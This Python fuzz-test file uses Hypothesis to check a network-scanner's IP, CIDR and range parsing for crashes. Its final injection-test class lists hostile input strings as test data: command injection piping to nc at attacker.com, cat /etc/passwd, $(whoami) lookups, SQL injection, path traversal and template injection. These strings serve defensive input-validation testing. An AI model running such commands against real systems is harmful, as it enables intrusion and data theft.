#!/usr/bin/env python3
"""
Fuzz Tests for Network Input Parsing
====================================

Tests IP address parsing, CIDR notation handling, and IP range parsing
from the network-scanner and related security tools.

Uses Hypothesis for property-based testing to discover edge cases
in input validation.
"""

import ipaddress
import sys
from pathlib import Path
from typing import Generator, List

import pytest
from hypothesis import assume, given, settings, HealthCheck
from hypothesis import strategies as st


# Add tools to path for imports
TOOLS_PATH = Path(__file__).parent.parent.parent / "tools"
sys.path.insert(0, str(TOOLS_PATH / "network-scanner"))
sys.path.insert(0, str(TOOLS_PATH / "port-scanner"))


# =============================================================================
# Import target functions
# =============================================================================

try:
    from tool import NetworkScanner, ScanConfig
    NETWORK_SCANNER_AVAILABLE = True
except ImportError:
    NETWORK_SCANNER_AVAILABLE = False
    NetworkScanner = None
    ScanConfig = None


# =============================================================================
# Custom Strategies for Network Inputs
# =============================================================================

# Strategy for valid IPv4 octets
ipv4_octet = st.integers(min_value=0, max_value=255)

# Strategy for valid IPv4 addresses as strings
valid_ipv4 = st.builds(
    lambda a, b, c, d: f"{a}.{b}.{c}.{d}",
    ipv4_octet, ipv4_octet, ipv4_octet, ipv4_octet
)

# Strategy for valid CIDR prefixes
cidr_prefix = st.integers(min_value=0, max_value=32)

# Strategy for valid CIDR notation
valid_cidr = st.builds(
    lambda ip, prefix: f"{ip}/{prefix}",
    valid_ipv4, cidr_prefix
)

# Strategy for IP ranges (e.g., 192.168.1.1-254)
valid_ip_range = st.builds(
    lambda a, b, c, start, end: f"{a}.{b}.{c}.{min(start, end)}-{max(start, end)}",
    ipv4_octet, ipv4_octet, ipv4_octet,
    st.integers(min_value=1, max_value=254),
    st.integers(min_value=1, max_value=254)
)

# Strategy for malformed/fuzzy IPv4 addresses
fuzzy_ipv4 = st.one_of(
    # Too many octets
    st.builds(
        lambda a, b, c, d, e: f"{a}.{b}.{c}.{d}.{e}",
        ipv4_octet, ipv4_octet, ipv4_octet, ipv4_octet, ipv4_octet
    ),
    # Too few octets
    st.builds(
        lambda a, b, c: f"{a}.{b}.{c}",
        ipv4_octet, ipv4_octet, ipv4_octet
    ),
    # Negative octets
    st.builds(
        lambda a, b, c, d: f"{a}.{b}.{c}.{d}",
        st.integers(min_value=-1000, max_value=500),
        st.integers(min_value=-1000, max_value=500),
        st.integers(min_value=-1000, max_value=500),
        st.integers(min_value=-1000, max_value=500)
    ),
    # With leading zeros
    st.builds(
        lambda a, b, c, d: f"0{a}.0{b}.0{c}.0{d}",
        st.integers(min_value=0, max_value=99),
        st.integers(min_value=0, max_value=99),
        st.integers(min_value=0, max_value=99),
        st.integers(min_value=0, max_value=99)
    ),
    # With spaces
    st.builds(
        lambda a, b, c, d: f" {a} . {b} . {c} . {d} ",
        ipv4_octet, ipv4_octet, ipv4_octet, ipv4_octet
    ),
    # Empty components
    st.just("..."),
    st.just("192..1.1"),
    st.just(".168.1.1"),
    st.just("192.168.1."),
    # Very large numbers
    st.builds(
        lambda a: f"{a}.{a}.{a}.{a}",
        st.integers(min_value=256, max_value=999999)
    ),
)

# Strategy for malformed CIDR notation
fuzzy_cidr = st.one_of(
    # Invalid prefix
    st.builds(
        lambda ip, prefix: f"{ip}/{prefix}",
        valid_ipv4, st.integers(min_value=33, max_value=128)
    ),
    # Negative prefix
    st.builds(
        lambda ip, prefix: f"{ip}/{prefix}",
        valid_ipv4, st.integers(min_value=-100, max_value=-1)
    ),
    # Non-numeric prefix
    st.builds(
        lambda ip: f"{ip}/abc",
        valid_ipv4
    ),
    # Double slash
    st.builds(
        lambda ip, prefix: f"{ip}//{prefix}",
        valid_ipv4, cidr_prefix
    ),
    # Missing prefix
    st.builds(
        lambda ip: f"{ip}/",
        valid_ipv4
    ),
)

# Strategy for arbitrary text that might be passed as IP
arbitrary_network_input = st.one_of(
    st.text(min_size=0, max_size=100),
    st.binary(min_size=0, max_size=50).map(lambda b: b.decode("utf-8", errors="ignore")),
    st.sampled_from([
        "",
        " ",
        "\n",
        "\t",
        "localhost",
        "127.0.0.1",
        "0.0.0.0",
        "255.255.255.255",
        "::1",
        "fe80::1",
        "2001:db8::1",
        "192.168.1.1/24",
        "192.168.1.0/32",
        "10.0.0.0/8",
        "192.168.1.1-254",
        "192.168.1.1-1",
        "-1.0.0.0",
        "999.999.999.999",
        "1.2.3.4.5",
        "a.b.c.d",
        "192.168.1",
        "192.168",
        "192",
        "1234567890",
        "null",
        "NULL",
        "None",
        "undefined",
        "NaN",
        "<script>",
        "'; DROP TABLE --",
        "${127.0.0.1}",
        "{{127.0.0.1}}",
        "127.0.0.1%00",
        "127.0.0.1\x00extra",
    ])
)


# =============================================================================
# Helper Functions for Testing
# =============================================================================

def expand_targets_safe(targets: List[str]) -> Generator[str, None, None]:
    """
    Safe wrapper around NetworkScanner._expand_targets that handles errors.
    Returns empty generator on error.
    """
    if not NETWORK_SCANNER_AVAILABLE:
        return

    try:
        config = ScanConfig(targets=targets)
        scanner = NetworkScanner(config)
        yield from scanner._expand_targets()
    except Exception:
        # Any exception is acceptable - we're testing robustness
        return


def is_valid_ip(ip_str: str) -> bool:
    """Check if string is a valid IPv4 address."""
    try:
        ipaddress.IPv4Address(ip_str)
        return True
    except (ipaddress.AddressValueError, ValueError):
        return False


def is_valid_cidr(cidr_str: str) -> bool:
    """Check if string is a valid CIDR notation."""
    try:
        ipaddress.IPv4Network(cidr_str, strict=False)
        return True
    except (ipaddress.AddressValueError, ipaddress.NetmaskValueError, ValueError):
        return False


# =============================================================================
# Fuzz Tests
# =============================================================================

@pytest.mark.fuzz
class TestNetworkInputFuzzing:
    """Fuzz tests for network input parsing."""

    @given(ip=valid_ipv4)
    @settings(max_examples=200, suppress_health_check=[HealthCheck.too_slow])
    def test_valid_ipv4_parsing_never_crashes(self, ip: str):
        """Valid IPv4 addresses should never cause crashes."""
        # This should always be a valid IP
        assert is_valid_ip(ip), f"Generated invalid IP: {ip}"

        # Expansion should work without exception
        if NETWORK_SCANNER_AVAILABLE:
            results = list(expand_targets_safe([ip]))
            # Valid single IP should produce exactly one result
            assert len(results) <= 1, f"Single IP {ip} expanded to multiple: {results}"

    @given(cidr=valid_cidr)
    @settings(max_examples=200, suppress_health_check=[HealthCheck.too_slow])
    def test_valid_cidr_parsing_never_crashes(self, cidr: str):
        """Valid CIDR notation should never cause crashes."""
        if NETWORK_SCANNER_AVAILABLE:
            # Should not raise any exception
            results = list(expand_targets_safe([cidr]))
            # Results should all be valid IPs
            for ip in results:
                assert is_valid_ip(ip), f"CIDR {cidr} produced invalid IP: {ip}"

    @given(ip_range=valid_ip_range)
    @settings(max_examples=200, suppress_health_check=[HealthCheck.too_slow])
    def test_valid_ip_range_parsing_never_crashes(self, ip_range: str):
        """Valid IP ranges should never cause crashes."""
        if NETWORK_SCANNER_AVAILABLE:
            results = list(expand_targets_safe([ip_range]))
            # All results should be valid IPs
            for ip in results:
                assert is_valid_ip(ip), f"Range {ip_range} produced invalid IP: {ip}"

    @given(fuzzy_ip=fuzzy_ipv4)
    @settings(max_examples=500, suppress_health_check=[HealthCheck.too_slow])
    def test_malformed_ipv4_does_not_crash(self, fuzzy_ip: str):
        """Malformed IPv4 addresses should not crash the parser."""
        if NETWORK_SCANNER_AVAILABLE:
            # This should not raise an exception (may return empty or skip)
            try:
                results = list(expand_targets_safe([fuzzy_ip]))
                # If it returns results, they should be valid
                for ip in results:
                    assert is_valid_ip(ip), f"Malformed input {fuzzy_ip!r} produced invalid IP: {ip}"
            except (ValueError, TypeError, ipaddress.AddressValueError):
                # These exceptions are acceptable for malformed input
                pass

    @given(fuzzy_cidr=fuzzy_cidr)
    @settings(max_examples=300, suppress_health_check=[HealthCheck.too_slow])
    def test_malformed_cidr_does_not_crash(self, fuzzy_cidr: str):
        """Malformed CIDR notation should not crash the parser."""
        if NETWORK_SCANNER_AVAILABLE:
            try:
                results = list(expand_targets_safe([fuzzy_cidr]))
                for ip in results:
                    assert is_valid_ip(ip), f"Malformed CIDR {fuzzy_cidr!r} produced invalid IP: {ip}"
            except (ValueError, TypeError, ipaddress.AddressValueError, ipaddress.NetmaskValueError):
                pass

    @given(arbitrary=arbitrary_network_input)
    @settings(max_examples=1000, suppress_health_check=[HealthCheck.too_slow, HealthCheck.filter_too_much])
    def test_arbitrary_input_does_not_crash(self, arbitrary: str):
        """Arbitrary input should never crash the network parser."""
        if NETWORK_SCANNER_AVAILABLE:
            # The primary assertion is that this doesn't crash
            try:
                results = list(expand_targets_safe([arbitrary]))
                # If we got results, verify they're valid
                for ip in results:
                    # Results should be valid IP addresses
                    assert is_valid_ip(ip), f"Arbitrary input {arbitrary!r} produced invalid IP: {ip}"
            except Exception as e:
                # Controlled exceptions are acceptable
                acceptable = (ValueError, TypeError, AttributeError,
                             ipaddress.AddressValueError, ipaddress.NetmaskValueError)
                assert isinstance(e, acceptable), f"Unexpected exception type: {type(e).__name__}: {e}"

    @given(targets=st.lists(arbitrary_network_input, min_size=0, max_size=10))
    @settings(max_examples=200, suppress_health_check=[HealthCheck.too_slow, HealthCheck.filter_too_much])
    def test_multiple_targets_does_not_crash(self, targets: List[str]):
        """Multiple targets (valid or invalid) should not crash."""
        if NETWORK_SCANNER_AVAILABLE:
            try:
                results = list(expand_targets_safe(targets))
                # All results should be valid IPs
                for ip in results:
                    assert is_valid_ip(ip), f"Multiple targets produced invalid IP: {ip}"
            except Exception:
                # Any exception from invalid input is acceptable
                pass


@pytest.mark.fuzz
class TestIPAddressBoundaryConditions:
    """Test boundary conditions in IP address parsing."""

    @pytest.mark.parametrize("octet_value", [0, 1, 127, 128, 254, 255])
    def test_boundary_octets(self, octet_value: int):
        """Test boundary values for each octet position."""
        test_ips = [
            f"{octet_value}.0.0.0",
            f"0.{octet_value}.0.0",
            f"0.0.{octet_value}.0",
            f"0.0.0.{octet_value}",
        ]
        for ip in test_ips:
            assert is_valid_ip(ip), f"Boundary IP {ip} should be valid"
            if NETWORK_SCANNER_AVAILABLE:
                results = list(expand_targets_safe([ip]))
                assert len(results) <= 1

    @pytest.mark.parametrize("cidr_prefix", [0, 1, 8, 16, 24, 30, 31, 32])
    def test_boundary_cidr_prefixes(self, cidr_prefix: int):
        """Test boundary values for CIDR prefixes."""
        cidr = f"192.168.1.0/{cidr_prefix}"
        if NETWORK_SCANNER_AVAILABLE:
            results = list(expand_targets_safe([cidr]))
            # Should produce valid IPs
            for ip in results:
                assert is_valid_ip(ip)

    def test_special_addresses(self):
        """Test handling of special IP addresses."""
        special_ips = [
            "0.0.0.0",          # Unspecified
            "127.0.0.1",        # Loopback
            "255.255.255.255",  # Broadcast
            "224.0.0.1",        # Multicast
            "169.254.0.1",      # Link-local
            "10.0.0.1",         # Private Class A
            "172.16.0.1",       # Private Class B
            "192.168.0.1",      # Private Class C
        ]
        for ip in special_ips:
            assert is_valid_ip(ip)
            if NETWORK_SCANNER_AVAILABLE:
                results = list(expand_targets_safe([ip]))
                assert len(results) == 1
                assert results[0] == ip


@pytest.mark.fuzz
class TestCIDRExpansion:
    """Test CIDR expansion properties."""

    @given(
        a=ipv4_octet, b=ipv4_octet, c=ipv4_octet,
        prefix=st.integers(min_value=24, max_value=32)
    )
    @settings(max_examples=100, suppress_health_check=[HealthCheck.too_slow])
    def test_cidr_expansion_count(self, a: int, b: int, c: int, prefix: int):
        """CIDR expansion should produce correct number of hosts."""
        cidr = f"{a}.{b}.{c}.0/{prefix}"

        if NETWORK_SCANNER_AVAILABLE and is_valid_cidr(cidr):
            results = list(expand_targets_safe([cidr]))

            # Calculate expected host count (excluding network and broadcast for /31 and larger)
            if prefix == 32:
                expected_max = 1
            elif prefix == 31:
                expected_max = 2
            else:
                expected_max = (2 ** (32 - prefix)) - 2

            # Results should not exceed expected
            assert len(results) <= expected_max, \
                f"CIDR {cidr} produced {len(results)} hosts, expected max {expected_max}"

    def test_cidr_24_expansion(self):
        """A /24 network should expand to exactly 254 hosts."""
        cidr = "192.168.1.0/24"
        if NETWORK_SCANNER_AVAILABLE:
            results = list(expand_targets_safe([cidr]))
            # /24 has 254 usable hosts (256 - network - broadcast)
            assert len(results) == 254, f"Expected 254 hosts, got {len(results)}"


@pytest.mark.fuzz
class TestIPRangeExpansion:
    """Test IP range expansion properties."""

    @given(
        a=ipv4_octet, b=ipv4_octet, c=ipv4_octet,
        start=st.integers(min_value=1, max_value=254),
        end=st.integers(min_value=1, max_value=254)
    )
    @settings(max_examples=100, suppress_health_check=[HealthCheck.too_slow])
    def test_range_expansion_count(self, a: int, b: int, c: int, start: int, end: int):
        """IP range expansion should produce correct number of addresses."""
        # Ensure start <= end
        if start > end:
            start, end = end, start

        ip_range = f"{a}.{b}.{c}.{start}-{end}"

        if NETWORK_SCANNER_AVAILABLE:
            results = list(expand_targets_safe([ip_range]))
            expected_count = end - start + 1

            assert len(results) == expected_count, \
                f"Range {ip_range} produced {len(results)} IPs, expected {expected_count}"

    @given(
        a=ipv4_octet, b=ipv4_octet, c=ipv4_octet,
        value=st.integers(min_value=1, max_value=254)
    )
    @settings(max_examples=50)
    def test_single_value_range(self, a: int, b: int, c: int, value: int):
        """Range where start equals end should produce single IP."""
        ip_range = f"{a}.{b}.{c}.{value}-{value}"

        if NETWORK_SCANNER_AVAILABLE:
            results = list(expand_targets_safe([ip_range]))
            assert len(results) == 1
            assert results[0] == f"{a}.{b}.{c}.{value}"


# =============================================================================
# Injection Attack Tests
# =============================================================================

@pytest.mark.fuzz
@pytest.mark.security
class TestInjectionAttacks:
    """Test for injection attack resistance in network inputs."""

    @pytest.mark.parametrize("malicious_input", [
        # Command injection attempts
        "192.168.1.1; ls",
        "192.168.1.1 && cat /etc/passwd",
        "192.168.1.1 | nc attacker.com 4444",
        "$(whoami).attacker.com",
        "`id`",
        "192.168.1.1\nmalicious",

        # SQL injection attempts
        "192.168.1.1' OR '1'='1",
        "192.168.1.1; DROP TABLE hosts;--",
        "' UNION SELECT * FROM users--",

        # Path traversal attempts
        "192.168.1.1/../../../etc/passwd",
        "192.168.1.1%2F..%2F..%2Fetc%2Fpasswd",

        # Template injection attempts
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",

        # Null byte injection
        "192.168.1.1\x00.attacker.com",
        "192.168.1.1%00extra",

        # Unicode attacks
        "192\u002e168\u002e1\u002e1",  # Using Unicode periods
        "\u0031\u0039\u0032.168.1.1",  # Unicode digits
    ])
    def test_injection_attack_handling(self, malicious_input: str):
        """Malicious inputs should not produce unexpected behavior."""
        if NETWORK_SCANNER_AVAILABLE:
            try:
                results = list(expand_targets_safe([malicious_input]))
                # If any results returned, they must be valid IPs
                for ip in results:
                    assert is_valid_ip(ip), \
                        f"Malicious input {malicious_input!r} produced suspicious output: {ip}"
                    # Ensure no command characters in output
                    dangerous_chars = [';', '|', '&', '$', '`', '\n', '\r', '\x00']
                    for char in dangerous_chars:
                        assert char not in ip, \
                            f"Dangerous character {char!r} in output from {malicious_input!r}"
            except Exception:
                # Exceptions are acceptable for malicious input
                pass
